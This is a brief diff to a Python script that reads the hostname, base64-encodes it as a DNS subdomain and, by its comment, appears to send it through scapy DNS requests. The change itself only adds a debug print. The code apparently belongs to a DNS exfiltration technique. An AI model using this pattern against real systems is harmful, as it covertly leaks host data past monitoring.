@@ -11,6 +11,7 @@ def main():
     host = subprocess.check_output('hostname')
     b64enc = base64.b64encode(str(host).encode())
     subdomain = b64enc.decode()
+    print(f"Sending: {subdomain}")
 
 
     #This performs a web request that returns an associated IP address: https://scapy.readthedocs.io/en/latest/usage.html#dns-requests
